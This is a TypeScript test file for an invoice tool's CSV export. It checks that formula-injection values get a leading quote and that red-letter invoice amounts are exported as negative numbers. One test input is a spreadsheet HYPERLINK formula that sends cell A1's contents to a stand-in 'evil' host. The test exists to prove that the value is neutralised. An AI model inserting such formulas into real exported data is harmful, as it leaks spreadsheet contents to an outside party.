import type { Invoice } from '@invoice-tool/core';
import { describe, expect, it } from 'vitest';

import { invoicesToCsv } from './print';

function invoice(over: Partial<Invoice> = {}): Invoice {
  return {
    id: 'id',
    fileName: '发票.pdf',
    fileSize: 100,
    sha256: 'hash',
    kind: 'vat-general',
    items: [],
    pageCount: 1,
    provenance: {},
    issues: [],
    ...over,
  };
}

describe('invoicesToCsv — 公式注入', () => {
  it('销售方以 = 开头 → 加前导单引号，Excel 不会执行', () => {
    const csv = invoicesToCsv([
      invoice({ sellerName: '=HYPERLINK("https://evil/?x="&A1,"open")' }),
    ]);
    expect(csv).toContain(`"'=HYPERLINK(""https://evil/?x=""&A1,""open"")"`);
  });

  it('文件名 / 购买方 / 大写金额同样处理', () => {
    const csv = invoicesToCsv([
      invoice({
        fileName: '@SUM(1+1)',
        buyerName: '+1+1',
        totalInWords: '-2+3',
      }),
    ]);
    expect(csv).toContain(`"'@SUM(1+1)"`);
    expect(csv).toContain(`"'+1+1"`);
    expect(csv).toContain(`"'-2+3"`);
  });

  it('制表符开头也算危险（Excel 会跳过前导空白再当公式）', () => {
    const csv = invoicesToCsv([invoice({ sellerName: '\t=1+1' })]);
    expect(csv).toContain(`"'\t=1+1"`);
  });

  it('长发票号码仍然写成文本公式（不是注入）', () => {
    const csv = invoicesToCsv([invoice({ invoiceNo: '12345678901234567890' })]);
    expect(csv).toContain(`"=""12345678901234567890"""`);
  });

  it('正常名称保持原样', () => {
    const csv = invoicesToCsv([invoice({ sellerName: '某某科技有限公司' })]);
    expect(csv).toContain('"某某科技有限公司"');
  });

  it('负数金额（红字发票）不加前导单引号，Excel 里还能求和', () => {
    const csv = invoicesToCsv([
      invoice({ amount: -123_45, tax: -16_05, total: -139_50 }),
    ]);
    expect(csv).toContain('"-123.45"');
    expect(csv).toContain('"-16.05"');
    expect(csv).toContain('"-139.50"');
    // 金额列不该出现 `'-` 这种「被当成文本中和过」的形状
    expect(csv).not.toContain(`"'-`);
  });

  it('金额是数字，不是从文件里抄来的文本：不会被当公式', () => {
    const csv = invoicesToCsv([invoice({ amount: 100_00, total: 113_00 })]);
    expect(csv).toContain('"100.00"');
    expect(csv).toContain('"113.00"');
  });

  it('标了红冲但小写漏了负号：三个金额列一起变负，与 xlsx 导出同口径', () => {
    // 这张票 `signedAmount` / `invoiceTotal` 都会取负；如果只给「价税合计」取负，
    // 两条导出就会给出相反的不含税金额与税额符号，核对两张表的人会以为算错了。
    const csv = invoicesToCsv([
      invoice({ isRed: true, amount: 500000, tax: 30000, total: 530000 }),
    ]);
    expect(csv).toContain('"-5000.00"');
    expect(csv).toContain('"-300.00"');
    expect(csv).toContain('"-5300.00"');
  });

  it('正常票的三个金额列保持正数', () => {
    const csv = invoicesToCsv([invoice({ amount: 500000, tax: 30000, total: 530000 })]);
    expect(csv).toContain('"5000.00"');
    expect(csv).toContain('"300.00"');
    expect(csv).toContain('"5300.00"');
  });
});
